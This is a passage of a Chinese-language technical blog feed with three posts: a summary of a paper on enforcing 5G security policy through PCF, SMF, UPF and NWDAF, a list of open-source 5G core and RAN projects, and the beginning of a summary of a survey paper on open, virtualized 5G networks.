中配置，可用於輕鬆管理安全服務。例如：</p><ul><li>由具有特殊安全要求（例如加密演算法、密鑰長度等）的特定一組UE或切片的特定安全參數index標識出的安全關聯</li><li>像是交通控制之類的偵測與動態QoS 規則可以被動態應用</li></ul><p>下面流程圖描繪了應用安全規則作為在網路中QoS策略的一部分概念:<br><img src="https://i.imgur.com/3514RyB.png"></p><p>下圖為透過以上概念實現的安全呼叫步驟<br><img src="https://i.imgur.com/1t07hXz.png"></p><p><em>1.a</em> <span class="special"><strong>NWDAF → PCF</strong></span><br>PCF訂閱了NWDAF通知<br>由於網路安全事件(ex. DDoS)，我們發現了使用者資料擁塞的情況，該情況透過N23介面傳送給了PCF</p><p><em>1.b</em> <span class="special"><strong>Security Management → PCF</strong></span><br>安全管理系統通過REST API與PCF整合而成<br>安全事件被報告給PCF</p><p><em>1.c</em> <span class="special"><strong>PCF → UDR(optional)</strong></span><br>PCF藉由N36介面向UDR請求一組資料<br>在此用例中，請求資料可以是訂閱策略集的安全策略部分的ID，以在發生安全事件時應用。</p><p><em>2.</em> <span class="special"><strong>PCF → SMF</strong></span><br>當PCF做出策略決定後，PCF則確定SMF需要更新策略資訊以緩解安全問題，並藉由N7介面發送一個<br><strong>Npcf_SMPolicyControl_UpdateNotify</strong> 請求其中包含關於PDU Session的更新策略資訊，在這種情況下建立新的 Session AMBR</p><p><em>3.</em> <span class="special"><strong>SMF → PCF</strong></span><br>SMF回應PCF一個ACK</p><p><em>4.a</em> <span class="special"><strong>SMF → UPF</strong></span><br>基於SMF所發送的QoS Emforcement Rule的QoS enforcement是一個由UPF提供的功能<br>包含通過N4介面對Session AMBR (Step2 從SMF接收來自PCF)</p><p><em>4.b</em> <span class="special"><strong>SMF → UE</strong></span><br>藉由AMF與UE交換N1 SM信令，來提供UE QoS規則<br>e.g. 設定新的UE-AMBR 來限制在UE所有PDU Session中所有Non-GBR QoS Flow所被預期可提供的最高Bit rate</p><p><em>4.c</em>  <span class="special"><strong>SMF → 5G AN</strong></span><br>藉由AMF與5G-RAN交換N2 SM信令，以設定5G RAN的QoS參數<br>e.g. 為特定類型的流量預留資源</p><h3 id="3-2-User-plane-security-enforcement-and-assurance"><a href="#3-2-User-plane-security-enforcement-and-assurance" class="headerlink" title="3.2. User plane security enforcement and assurance"></a>3.2. User plane security enforcement and assurance</h3><p>在UP 流量上實現安全策略的方式是一樣是基於策略控制</p><p>直接作用於AMF、SMF等控制NF，而PCF應到達UE、RAN和UPF以直接在UP上應用這些策略</p><h4 id="3-2-1-Security-policies-enforcement-via-AMF"><a href="#3-2-1-Security-policies-enforcement-via-AMF" class="headerlink" title="3.2.1. Security policies enforcement via AMF"></a>3.2.1. Security policies enforcement via AMF</h4><p><img src="https://i.imgur.com/MfoI2Au.png"></p><p>有兩種類別的策略是為了<strong>存取</strong>與<strong>移動性管理</strong><br>它們被AMF執行、由PCF規定並儲存在UDR中<br>它們可以支持安全用例，而無需對策略定義進行重大更改：</p><ul><li><p>Policies transfered from PCF to AMF:</p><ul><li>Service area restrications<br>  <strong>Tracking Area</strong> 是一種區域上的邏輯概念，使用者可在其中移動而無須更新管理節點，網路會分配一個或多個TAs到使用者上<br>  而Service area restrication包含<strong>允許區域</strong>與<strong>非允許區域</strong><br>  本篇論文提出，使用特定閥值為不同服務區域建立安全等級，來決定使用者是否有權移動到高安全服務區域<br>  舉例: 地理上的敏感地區，像是關鍵基礎設施可能會限制對使用 <strong>“Null Schema”</strong> 來產生SUCI的使用者的存取，以防止像是惡意基地台的影響，換句話說可能會允許支援UP完整性保護的使用者存取<br>  <img src="https://i.imgur.com/EXWGDgX.png"></li><li>Priorities of area types the user may use<br>  適當的優先權定義可避免<strong>降級攻擊</strong>，迫使UE連接到更多脆弱性的網路(像是2G)，比起4G、5G網路來說更容易遭受攻擊，攻擊者可以通過使 UE 和網絡實體分別相信對方不支持安全功能來嘗試降級攻擊，即使雙方實際上都支持該安全功能<br>  <img src="https://i.imgur.com/8nbzQWr.png"><br>  <strong>Anti-Bidding down Architecture</strong> 在Release 15中已經定義，但目前並為真正生效，因為它的目的是在於防止從未來的增強安全功能降低到當前的安全功能<br>  <img src="https://i.imgur.com/PC8zo8N.png"></li></ul></li><li><p>Policies transferred from PCF to the UE via AMF</p><ul><li>User Equipment Route Selection Policy to determine how to route egress traffic(PDU selection policies)<br>  當安全事件發生時可能會觸發新的PDU Session(e.g. 在UE中的惡意程式偵測)i.e.<br>  一種在data path上具有特殊策略的<strong>隔離</strong> PDU，甚至是在具有特殊安全服務的安全DN中終止的PDU</li></ul></li></ul><p><span class="special">LADN(Local Area Data Network)的概念在5G中用於支援MEC，並支援上述措施的實踐。LADN對僅授權在某一組位置(被稱為<strong>LADN Services Areas</strong>)中的PDU Session中實施限制。</span></p><p><span class="special">LADN services Areas 在AMF中基於每個DNN去進行設定，而AMF會提供UE LADN Service Areas的資訊</span></p><h4 id="3-2-2-Security-policies-enforcement-via-SMF"><a href="#3-2-2-Security-policies-enforcement-via-SMF" class="headerlink" title="3.2.2. Security policies enforcement via SMF"></a>3.2.2. Security policies enforcement via SMF</h4><blockquote><p>SMF 功能介紹 : SMF負責控制一個PDU Session所需的信令(通過N4信令)，並設定這個PDU Session中的用戶平面處理(支援PDU Session的用戶平面功能(UPF)的選擇)</p></blockquote><p>因此SMF控制了UPF所支援的功能，包含安全相關的功能像是，防火牆、節省流量、DDoS保護、GPRS Tunneling Protocol(GTP)、(新的Inter PLMN UP Security in Release16)等等功能</p><p>此外它還控制策略執行(policies enforcement)，即與PCF互動來獲得策略，並將其直接應用到UPF(via N4)或藉由AMF應用到NG-RAN網路中的其他部分.</p><blockquote><p>Proposal: 提議是被嵌入到UPF的安全控制可通過PCF中的安全策略進行管理</p></blockquote><p>此外，這個新概念將使air interface中的用戶平面安全實施策略（機密性和完整性保護）在 PCF 中管理（而不是像今天一樣在 SMF 中本地配置），而它們是來自UDR(作為具有預定義安全策略的策略設定文件的儲存)</p><p>因此，這些策略應要是專用於用戶平面安全的Dynamic PCC rules的一部分，並可能擴展到其他的domain或UP介面，像是:<br>N6: UPF $\leftrightarrow$ Data Network， 基於IP或Ethernet傳輸<br>N3: UPF $\leftrightarrow$ 5G-RAN，基於GTPv1-U(GPRS Tunneling Protocol User Plane)<br>N9: UPF $\leftrightarrow$ UPF，用以傳輸用戶平面資料，基於GTPv1-U</p><h4 id="3-2-3-UP-security-enforcement-use-cases"><a href="#3-2-3-UP-security-enforcement-use-cases" class="headerlink" title="3.2.3. UP security enforcement use cases"></a>3.2.3. UP security enforcement use cases</h4><p>用於 5G 概念的 N6-LAN 應允許 PCF 設定 UPF 以實現安全服務功能鏈到數據網絡<br><img src="https://i.imgur.com/ZkrVdFk.png"></p><blockquote><p> N3 介面保護機制:  TS33.501 表明在N3(UPF $\leftrightarrow$ RAN)進行資料傳輸應具備機密性、完整性、重放攻擊保護。所需機制是IPSec ESP和 IKEv2 基於憑證的授權機制，然而使用哪種密碼學機制來保護N3是取決於營運商的決定</p></blockquote><p>在不久的將來，可以根據提供給一組用戶、切片和&#x2F;或租戶的安全級別選擇性地部署這些類型的解決方案，具體取決於服務或基礎設施的要求和重要性</p><p>舉例來說:<br>例如，服務於關鍵基礎設施（例如公用事業）的專用網絡，或車載自組織網絡（VANET），當然需要對無線基地台和核網之間的通訊進行全面保護</p><blockquote><p>Proposal :  本篇論文的提議是；將用於N3的加密解決方案包含進PCC規則中，並強制執行於gNB(via AMF)和UPF系統中的安全閘道器之中(via SMF)強制執行應建立新的IPSec Tunnel或將 PDU 分配給現有的 IPSec Tunnel</p></blockquote><p>同樣的概念也可應用於N9上一些用例所使用的安全方式，像是不同營運商之間互相連接。這種情況下 GTP檢查以及IPSec已被標準化，但不是作為一個”安全的SLA”的一部分通過PCF執行的，此外，通過新的分析功能（如 NWDAF）或資料庫（如UDSF,Unstructed Data Storage Function）來儲存session資料或從 UPF 或其他特定安全分析平台（可以關聯來自多個來源的事件）接收的安全事件，PCF 可以對查詢 UDR 的既定安全服務級別協議(Security SLA,SSLA)中的更改做出反應，應用新的安全策略，強制建立新的更安全的 PDU，即緩解觸發操作的安全問題</p><p><img src="https://i.imgur.com/8ZkUC6D.png"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">Ex:</span><br><span class="line">在某個區域網絡中檢測到假基站</span><br><span class="line">或者簡單地從安全的角度來看某個關鍵區域（例如機場、關鍵基礎設施站點等），</span><br><span class="line">PCF 將對該網絡地理區域中的基站所附的相關 UE/UE 組實施完整性保護。其他約束也可以構建有效的用例（例如，連接到關鍵切片的 UE）。 UE 的策略應從“不需要”更新為“首選”或“需要”</span><br></pre></td></tr></table></figure><p>下圖為PDU Session 建立的流程，以粗體顯示本論文要執行call<br>以提供所描述的來自 PCF 的安全策略的動態實施</p><p><img src="https://i.imgur.com/pFT8Zpv.png"></p><h3 id="3-2-4-Security-assurance"><a href="#3-2-4-Security-assurance" class="headerlink" title="3.2.4. Security assurance"></a>3.2.4. Security assurance</h3><p>一旦使用安全屬性（例如特定服務流的加密、完整性保護、訪問控制策略等）建立 PDU 會話，允許在網絡中進行擴展意義上的安全實施，仍有兩個關鍵方面值得關注可以考慮，即安全資料收集和cloased-loop automation，為了介紹它們，使用了Chargin Function(CHF)做為類比</p><p><img src="https://i.imgur.com/SAtlROD.png"></p><p>使用資料收集可用於計費、收集統計數據和監控整體網絡使用情況和 UE 行為。<br>當使用者超出某些閥值後(ex.花費額度限制)CHF會告知PCF，而PCF會將此考慮進動態應用相關策略至user session e.g. 給定PDU Session的QoS限制、重新導向到營運商網頁等等</p><blockquote><p>Proposal: 使用來自UPF中的嵌入式安全功能的安全相關資料來增強&#x2F;豐富資料收集</p></blockquote><p>SMF負責從UPF收集增強&#x2F;豐富資料並傳送到<strong>中央安全管理系統</strong> (儲存資料，並將其與網路中各種安全專用平台所蒐集的安全資訊做相互關聯) e.g. 防火牆log、Security telemetry、IDS Log等等</p><p>安全管理系統要負責創造安全事件，並在 PCF 和&#x2F;或 SMF 上觸發操作<br>e.g. 通知 PCF 某些安全 SLA 已被越過，將用戶流量重新導向到例如清理中心或專用安全 DN 等。</p><p>在 5G 中 UPF 在 4G Evolved Packet Core 中承擔流量檢測功能的角色，即封包檢測（例如基於業務數據流的應用檢測），因此它可以執行 PCF 策略。事實上，實現 UPF 的技術集成了越來越多的安全功能，如防火牆或運營商級網絡地址轉換。</p><p>5G 核心允許 PCF 在發送到 UE 的連接相關策略和發送到網絡的策略之間進行協調，這些策略可以部署在用戶平面的 UPF 中，例如嵌入在 UPF 中的 L7 防火牆中的安全策略，用於針對特定用戶的特定服務。以下兩個用例說明了這個概念：</p><h3 id="use-case1"><a href="#use-case1" class="headerlink" title="use case1"></a>use case1</h3><p>根據3GPP TS 23.503，PCF支援的用於PDU Session的SMF 選擇管理(Selection Management)的功能之一是，向AMF提供策略以通知PCF去針對特定DNN執行DNN replacement，此類replacement操作的觸發器，可能是由於安全事件而受損的DNN，由於特定DN或切片過載(ex. DDoS)，而通過NWADF報告給PCF</p><h3 id="use-case2"><a href="#use-case2" class="headerlink" title="use case2"></a>use case2</h3><p>當 SMF 收到 PCC 規則時，SMF 可以採取措施重新設定 PDU 的 UP。這些行動之一可以是使用新的指導規則來更新UPF，例如將某些可疑流量轉發到本地資料中心(Ex. MEC)，目的是在網路中的小型受控區域內遏制潛在的安全漏洞</p><p>MEC 的概念是促進 UPF 在網絡邊緣的部署，更靠近 UE，有時用於關鍵應用程序<br>e.g. Ultra Low Level latency use case、快取、體育場館等</p><p>作為對事件的響應(response)，應用功能(Application Function,AF)可以向5G核網(i.e PCF or via Network Exposure Function(NEF))發出請求，已將一組UE甚至整個切片的流量引導至位於邊緣的UPF，可以部署 DDoS 保護、清洗中心、IDS&#x2F;IPS 等安全功能作為遏制機制。</p><blockquote><p>AF功能: AFs與3GPP 核網互動，以提供服務:像是應用程式對流量路由的影響、存取NEF、與策略框架互動(藉由N5)等等 i.e. 它請求動態策略<br>如今，AF 作為 MEC 調度應用程式或 IP Multimedia System (IMS)。</p></blockquote><blockquote><p>Proposal: 將 AF 的範圍擴展到安全應用：</p></blockquote><ul><li>對於流量路由(traffic routing)的影響作為安全緩解機制<br>舉例:測到攻擊（例如 DDoS）時的 BGP Injection 和路由變更</li><li>藉由NEF存取5G核網<br>舉例:提供威脅情報源的第三方安全公司</li><li>與策略框架的互動<br>舉例: 由於不可預測的安全事件或由於新的威脅簽名而提供新的 SDF 過濾規則的策略變更</li></ul><h3 id="3-3-Establishing-security-policies-as-part-of-PCC-rules"><a href="#3-3-Establishing-security-policies-as-part-of-PCC-rules" class="headerlink" title="3.3. Establishing security policies as part of PCC rules"></a>3.3. Establishing security policies as part of PCC rules</h3><p>PCC規則將 <strong>SDF模板</strong>(服務資料filter的列表或應用程式filter的應用程式ID)<br>以及對流量的可能操作(策略實施)連接起來</p><p>以 3GPP 提出的當前行動為基礎，專注於純粹的QoS actions，我們建議出於安全目的擴展和應用這些actions，並歸納成表 1</p><p><img src="https://i.imgur.com/gXZeTff.png"></p><p>3GPP TS 23.503的6.3.1表格列出了PCC規則中包含的資訊，像是資訊名稱(information name)<br>、描述(description)、以及PCC是否可在SMF內被啟用的Dynamic PCC規則之中修改此資訊</p><p>表2 顯示 TS 23.503的6.3.1表格的摘錄<br><img src="https://i.imgur.com/a7jUM1v.png"><br>表格中的灰色區域顯示了在原標準上增添的元素</p><p>在”Security”類別中，有兩項Information Elements，這兩項元素涉及目前在用戶平面中存在的安全策略，但目前僅在SMF中進行本地管理且僅限於Access Network(AN)<br>我們的貢獻是使它們成為 PCC 規則結構的一部分：</p><ul><li><p>以PDU的層級來看，PCF 還可以控制 PDU Session的不同參數，其中包括 SMF 從 PDU Session中獲取新策略的條件（策略控制請求的觸發器），而這些條件對於定義安全用例十分重要 i.e.<br>若這些條件是安全觸發器(e.g.意外事件、過載、超出閥值等)，則PCC 安全規則將從 PCF 傳達到 SMF，並在 UPF 和&#x2F;或 5G-RAN中執行。</p></li><li><p>PDU Session相關策略資訊的目的是提供分別適用於單個監控金鑰匙或整個PDU Session的PCC(Policy and charging control)，PCF 可以將 PDU 會話相關的策略訊息與 PCC 規則一起或單獨提供給 SMF</p></li></ul><p>TS 23.503的6.4-1表格包含了PDU Session相關的策略資訊<br>表3 顯示 TS 23.503的6.4-1表格的摘錄，重點關注使用監控控制相關訊息，其中提出了兩個新的監控密鑰用於 (D)DoS 攻擊檢測。<br><img src="https://i.imgur.com/B6DC660.png"></p><p><span class="special">最後，PCF 還應指示 SMF 檢測哪些應用程序。在收到來自 SMF 的報告後，PCF 可以做出策略決定並向 SMF 發送更新的或新的 PCC 規則。如果網絡中的特定安全分析能夠定義攻擊，則應將相同的過程應用於安全 (e.g. 在bot 與 C&amp;C中心之間的通訊)或特徵化安全事件概況 (e.g. 意圖在通訊中使用指定協議的無效port來破壞存取控制防火牆規則 )</span><br>因此，可以像任何其他應用程序簽名一樣創建安全簽名，並應用相應的 PCC 規則。</p><h3 id="3-4-Security-analytics-implemented-in-NWDAF"><a href="#3-4-Security-analytics-implemented-in-NWDAF" class="headerlink" title="3.4. Security analytics implemented in NWDAF"></a>3.4. Security analytics implemented in NWDAF</h3><p><img src="https://i.imgur.com/pp10sLI.png"></p><p>NWDAF 提供的訊息可以對 PCF 執行的 PCC 決策過程做出重大貢獻</p><p>然而，分析訊息目前僅限於切片特定的網絡狀態，例如負載級別訊息。即，不需要知道使用切片的訂戶，但它在網絡切片級別工作</p><blockquote><p>Proposal: 擴展負載級別訊息，添加安全上下文訊息（例如事件、攻擊、漏洞等）</p></blockquote><p>它需要將單獨實施的安全功能或作為標準化網絡功能的一部分（例如具有嵌入式防火牆功能的 UPF）提供給 NWDAF 或中間專用安全分析平台。</p><p>標準 TS 23.288 [11] 為不同類型的 NWDAF 提供了可能性，專門用於不同類型的分析，由Analytics ID Information Element 所標識。</p><p>PCF 可以通過 N23 接口使用此訊息。其中一些訊息已經可以為安全分析和進一步實施提供非常有用的訊息，如前幾節所述。</p><p>[11] 的表 7.1-2 顯示了 NWDAF 服務提供的分析訊息。我們在此表中添加了一列，其中包含可能被提取到其他安全分析功能以進行進一步分析或直接提取到 PCF 框架以應用特定安全 PCC 規則的安全資訊（參見表 4）。</p><p><img src="https://i.imgur.com/URrNthl.png"></p><p>安全分析特別有趣的是 NWDAF 捕獲的與異常行為相關的網絡數據分析。</p><p>PCF 可以使用 <strong>Nnwdaf_AnalyticsSubscription_Subscribe</strong> 服務操作去訂閱與 “異常行為” 相關的網絡分析通知，目的是預測和檢測安全問題、觸發新的安全策略或更新特定 UE 或 UE 組的現有安全策略。 該封包括Analytics ID（”Abnormal behaviour”）、分析報告目標<strong>SUPI</strong>、<strong>Internal Group ID</strong> 和分析過濾器(filter)，包括異常 ID 列表和每個異常 ID 的可能閾值</p><p>前的異常 ID 列表在 [11] 中指定，例如“意外的 UE 位置”、“懷疑 DDoS 攻擊”、“錯誤的目標地址”等。標準的表 6.7.5.3-3 提供了減輕風險的策略和行動示例，例如“擴展服務區限制”、“釋放 PDU 會話”、“更新封包過濾器&#x2F;QoS”等。</p><p>如本文檔第 2.4 節所述，挑戰在於，在用戶平面級別，每個應用程序的通信描述僅限於該通信的流量和數據速率，與體積類型的攻擊（例如氾濫、過載、DoS 等）。</p><p>統計或預測中的變化或異常，例如 UE 通信的周期、通信持續時間或某些流量特徵（例如異常端口、可疑 DNN、其他有用訊息等）、上傳&#x2F;下載量（平均值和方差） ) 可能表示安全事件或事故。</p><p>在用戶平面層面，新提案包括，除了數量、變化和異常之外，NWDAF 可以直接從 UPF 收集真實的安全事件（事實），這要歸功於附加或嵌入其中的用戶平面安全檢查功能。此安全訊息可能會被 PCF 等活動 NF 使用，以動態更新 UE 組中特定 UE 的 PCC 規則、更改 PDU 或什至在需要時在切片級別採取行動</p><h2 id="4-Future-work"><a href="#4-Future-work" class="headerlink" title="4. Future work"></a>4. Future work</h2><p>基於本論文提出的Security Enforcement的原則，有三個領域可以進一步去研究</p><ul><li>specific security analytics supported by machine learning algorithms</li><li>roaming scenarios, including local break out</li><li>applicability to IoT use cases</li></ul><h2 id="5-Conclusion"><a href="#5-Conclusion" class="headerlink" title="5. Conclusion"></a>5. Conclusion</h2><p><img src="https://i.imgur.com/VkTuInH.png"></p><h2 id="參考資源"><a href="#參考資源" class="headerlink" title="參考資源"></a>參考資源</h2><p><a href="https://www.sciencedirect.com/science/article/pii/S0140366421001262">https://www.sciencedirect.com/science/article/pii/S0140366421001262</a></p><p>meeting簡報: <a href="https://drive.google.com/file/d/1RK6R5yjRuvS-BhdTjZPhOXAg9ghlW2O6/view?usp=sharing">https://drive.google.com/file/d/1RK6R5yjRuvS-BhdTjZPhOXAg9ghlW2O6/view?usp=sharing</a></p>]]></content>
      
      
      <categories>
          
          <category> 論文導讀 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 5G </tag>
            
            <tag> Security Policy </tag>
            
            <tag> 3GPP </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>🧪筆記-5G開源資源整理</title>
      <link href="/posts/dd26b396.html"/>
      <url>/posts/dd26b396.html</url>
      
        <content type="html"><![CDATA[<h2 id="架構"><a href="#架構" class="headerlink" title="架構:"></a>架構:</h2><p><img src="https://i.imgur.com/XyqAjzZ.png"></p><p><img src="https://i.imgur.com/3DQV6fW.png"></p><h2 id="開源專案"><a href="#開源專案" class="headerlink" title="開源專案"></a>開源專案</h2><ul><li>Open5GS - Open5GS contains a series of software components and network functions that implement the 4G&#x2F; 5G NSA and 5G SA core functions.<br><a href="https://github.com/open5gs/open5gs">https://github.com/open5gs/open5gs</a></li><li>open5gs + oai config :<a href="https://github.com/s5uishida/open5gs_epc_oai_sample_config">https://github.com/s5uishida/open5gs_epc_oai_sample_config</a><br>open5gs 有實作4G EPC 與 5G 5GC，因此以組網方案來說，option3、option7、option4可能都是可行的 </li><li>dockerlized Open5GS<br><a href="https://github.com/herlesupreeth/docker_open5gs">https://github.com/herlesupreeth/docker_open5gs</a></li><li>Softwarization of 5G System<br><a href="https://github.com/LABORA-INF-UFG/NetSoft2020-Tutorial4">https://github.com/LABORA-INF-UFG/NetSoft2020-Tutorial4</a></li><li>free5GC - Open Source 5G core network<br><a href="https://github.com/free5gc/free5gc/wiki">https://github.com/free5gc/free5gc/wiki</a></li><li>C-RAN 介紹<br><a href="https://www.ufispace.com/company/blog/what-is-cran-the-evolution-from-dran-to-cran">https://www.ufispace.com/company/blog/what-is-cran-the-evolution-from-dran-to-cran</a></li><li>UERANSIM  - is the open-source state-of-the-art 5G UE and RAN (gNodeB)<br><a href="https://github.com/aligungr/UERANSIM">https://github.com/aligungr/UERANSIM</a><br>好像有實作檔案，但是好像是用來測核網的，而且也還沒有符合O-RAN架構</li><li>Awesome 5G - 列出各種5G開源專案<br><a href="https://github.com/calee0219/awesome-5g">https://github.com/calee0219/awesome-5g</a></li><li>free5GRAN - 開源5G RAN架構 (以SA作為組網架構)<br><a href="https://github.com/free5G/free5GRAN">https://github.com/free5G/free5GRAN</a></li><li>O-RAN OSC<br><a href="https://github.com/o-ran-sc?language=c">https://github.com/o-ran-sc?language=c</a></li><li>OAI -Open Air Interface 5G<br><a href="https://gitlab.eurecom.fr/oai/openairinterface5g/-/wikis/home">https://gitlab.eurecom.fr/oai/openairinterface5g/-/wikis/home</a></li><li>OAI 5G NSA 搭建教學: <a href="https://blog.csdn.net/BUPTOctopus/article/details/107717942">https://blog.csdn.net/BUPTOctopus/article/details/107717942</a></li></ul><h2 id="O-RAN-Components"><a href="#O-RAN-Components" class="headerlink" title="O-RAN Components"></a>O-RAN Components</h2><p>OSC 釋出各component 下載<br><a href="https://wiki.o-ran-sc.org/pages/viewpage.action?pageId=20876303">https://wiki.o-ran-sc.org/pages/viewpage.action?pageId=20876303</a></p><p>O-RAM Developer Wiki - 裡面有部屬教學<br><a href="https://wiki.o-ran-sc.org/display/ORAN/Project+Developer+Wiki">https://wiki.o-ran-sc.org/display/ORAN/Project+Developer+Wiki</a></p>]]></content>
      
      
      <categories>
          
          <category> 資源整理 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 5G </tag>
            
            <tag> Network </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>🗂️論文賞析:O-RAN 以及虛擬化 5G 網路</title>
      <link href="/posts/a1cfeb54.html"/>
      <url>/posts/a1cfeb54.html</url>
      
        <content type="html"><![CDATA[<div class="note primary no-icon flat"><p>這是篇survey paper<br><strong>Title</strong>: “Open, Programmable, and Virtualized 5G Networks: State-of-the-Art and the Road Ahead”<br><strong>College</strong>: Institute for the Wireless Internet of Things, Northeastern University<br><strong>Authors</strong>: Leonardo Bonati,Michele Polese,Salvatore D’Oro,Stefano Basagni,Tommaso Melodia<br><strong>Citation</strong>: 24</p></div><h1 id="Abstract"><a href="#Abstract" class="headerlink" title="Abstract"></a>Abstract</h1><p>5G很多好處，Software-defined cellular networks 也帶來很多變化，目前也許多5G開源專案，本篇會介紹非常多當前的開源5G專案以及其內部細節，並介紹其框架跟相應的硬體環境與Testbeds。</p><h1 id="Introduction"><a href="#Introduction" class="headerlink" title="Introduction"></a>Introduction</h1><p>5G應用多元 - VR、遠程手術、高解析串流影像、私有(private)蜂窩網路，而傳統行動網路架構則相對不靈活、不彈性，無法滿足實現5G應用所具備的條件，現行行動網路的黑箱做法帶來許多限制，像是軟硬體隨插即用(plug and play)，但卻缺乏了重新設定的能力，並且無法控制大量可用資源，使其難以使網路操作達到即時流量控制這件事，並難以進行資源管理，效能也沒有最佳化，難以實現<strong>Connectivity-as-a-Service (CAAS)</strong> 技術，例如專用蜂窩網路(private cellular network)。</p><p>業界與學界皆認為5G應該改變這種Plug and play的作法，應該要採用可程式化、開放、資源共享、邊緣化的網路解決方案，例如 SDN、網路虛擬化、MEC(Multi-access Edge Computing)，這些方案使得動態網路控制與敏捷管理成為可能。同樣的，<strong>網路切片(Netwrok Slicing)</strong> 與  <strong>C-RAN(Cloud RAN)</strong> 也證實了 共享基礎架構(infrastrucutre sharing) 不僅能夠使資源利用最大化也能帶來新市場機會。傳統封閉的的電信網路一般人難以接觸到，現今由GNU Radio Libraries 定義的軟體範例被納入<strong>OpenAirInterface(OAI)</strong> 和<strong>srsLTE</strong> 之中，並可在商用SDR設備上快速部屬。軟體框架上像是O-RAN，運行在white-box 伺服器上，可供重新設定與優化網路和收發器功能。</p><h1 id="Architectural-enablers-of-5G-cellular-networks"><a href="#Architectural-enablers-of-5G-cellular-networks" class="headerlink" title="Architectural enablers of 5G cellular networks"></a>Architectural enablers of 5G cellular networks</h1><h2 id="Architecture"><a href="#Architecture" class="headerlink" title="Architecture"></a>Architecture</h2><p>行動網路已改變整體架構，從以往黑箱硬體配有專用軟韌體的架構變成基於運行在SDR或其他硬體的開元軟體，但這其實從4G時代就一直討論到現在。5G從spec上就極有敏捷部署的彈性在，在早期階段也在弄軟體化的服務，這種  <strong>flexibility-by-design</strong> 讓5G一開始就比較屌。此章節介紹從4G到5G的網路架構、RAN、核網、部屬範例、SDN、NFV、網路切片、MEC、智能(Intelligent)網路<br><img src="https://i.imgur.com/5fc7spi.png"></p><p>這張圖來看，4G部屬與5G似乎沒有差別，但其實在Core Network內部組成與設定卻差很多，</p><table><thead><tr><th>組成</th><th>4G</th><th>5G</th></tr></thead><tbody><tr><td>RAN</td><td>LTE</td><td>NR</td></tr><tr><td>Core</td><td>EPC</td><td>5GC</td></tr></tbody></table><p>4G EPC中有許多組成以往執行在專有硬體上的，最近才開始部署在軟體上的，<br>而5GC則是一開始就根據 基於服務的方法來設計的 EPC Server 被分成許多 <strong>虛擬網路功能(Virtual network functions)</strong> 來提供特定功能，彼此之間也透過開放標準界面來溝通；5G RAN中也有相似的拆分原則，(CU&#x2F;RU)…etc</p><h3 id="NR"><a href="#NR" class="headerlink" title="NR"></a>NR</h3><ul><li>wider range of carrier frequencies (mmWave Spectrum)</li><li>frame structure: OFDM-based，更具彈性、每個sub-frame中傳遞的可變數量的symbol，並可使用比LTE更大的頻寬(400Mhz per carrier)</li><li>訊號與程序的整合，用以管理mmWave的定向傳輸</li><li><strong>5G RAN可以接到4G EPC (non-standalone config) 與5G 5GC(standalone config)</strong></li><li>NR 基站 &#x3D; gNodeBs 允許分散式部屬: protocol stack的不同part可以分散在不同硬體組件中</li><li>NR的protocol stack中，在PDCP上在疊了一<strong>SDAP(Service Data Adaptation Protocol) layer</strong> ，它管理點對點流量之間的QoS，並將其mapping到gNodeB- UE link之間的本地資源，其他層皆有更新達到NR功能</li></ul><h3 id="CU-x2F-DU-split-and-the-virtualized-RAN-architecture"><a href="#CU-x2F-DU-split-and-the-virtualized-RAN-architecture" class="headerlink" title="CU&#x2F;DU split and the virtualized RAN architecture"></a>CU&#x2F;DU split and the virtualized RAN architecture</h3><p>NR中最創新的事就是將3GPP Stack 中的較高層(PDCP、SDAP、RRC)於較低層(RLC、MAC、PHY)分成兩個不同的logical units，也就是 CU(Control unit)與DU(Distributed Unit)，並可部屬在不同地方。而physical layer中的較低層可以與DU分開，獨立成一個RU(Radio Unit)；CU、DU、RU彼此可以藉由定義好的界面以不同的data rate跟latency來相互溝通。</p><p>這種架構出現在3GPP中，並使vRAN成(virtualized RAN)為可能:<br><code>attenna 元件</code> $\longrightarrow$ <code>RU</code><br><code>baseband、signal processing 單元</code> $\longrightarrow$ <code>CU、DU</code><br>以上皆可跑在通用或多廠商的平台或硬體元件上，若不同不同RAN components之間的介面是開放的，則部署上按照 O-RAN model走。</p><h3 id="The-5G-Core"><a href="#The-5G-Core" class="headerlink" title="The 5G Core"></a>The 5G Core</h3><p>service-based approach 控制與用戶平面核心功能被拆分成多個網路功能，3GPP中有定義這些網路功能的API，可實現彈性網路部屬與網路切片。</p><ul><li><strong>UPF(User Plane Function)</strong>: User到網路之間的gateway，作為移動性的錨(anchor)以及<strong>QoS分類器</strong></li><li><strong>CPF(Control Plane Function)</strong>:4G時的MME，大多被分配進了<strong>AMF(Access and Mobility Management Function)<strong>；</strong>SMF(Session Management Function)</strong> 負責分配IP地址到UE，並編排(orchestrates)用戶平面服務(例如:哪個UPF是UE該使用的)</li></ul><h2 id="Enabling-technologies-for-softwarized-5G-cellular-networks"><a href="#Enabling-technologies-for-softwarized-5G-cellular-networks" class="headerlink" title="Enabling technologies for softwarized 5G cellular networks"></a>Enabling technologies for softwarized 5G cellular networks</h2><p>5R整合不同功能組件、架構將會十分龐大，要管理將會是難題。5G網路參考了雲端計算生態圈中廣泛而完整的流程與架構，將虛擬化、軟體化整合在一起，使服務與辜能從原有硬體中抽離出來。</p><h3 id="Softwarization-and-software-defined-networking"><a href="#Softwarization-and-software-defined-networking" class="headerlink" title="Softwarization and software-defined networking"></a><code>Softwarization and software-defined networking</code></h3><p>為了整合不同廠商硬體元件之間的功能與設定參數，5G系統仰賴<strong>軟體化(Softwarization)</strong></p><ol><li>SDN </li><li>Openflow protocol</li></ol><blockquote><p>SDN: 將網路控制從data plane中解耦出來，將routing與controlling程序從原有的基於硬體的轉發操作中分離出來。5G中則是將RAN、邊緣硬體元件從它們的網路和服務功能中分離出來。</p></blockquote><p>RAN架構中只有RU維持基本transmit receive功能，其餘控制與處理則以藉由開放介面與API來用軟體操控。</p><h3 id="Network-function-virtualization-NFV"><a href="#Network-function-virtualization-NFV" class="headerlink" title="Network function virtualization(NFV)"></a><code>Network function virtualization(NFV)</code></h3><p>每項網路功能藉由VNF(Virtual Network 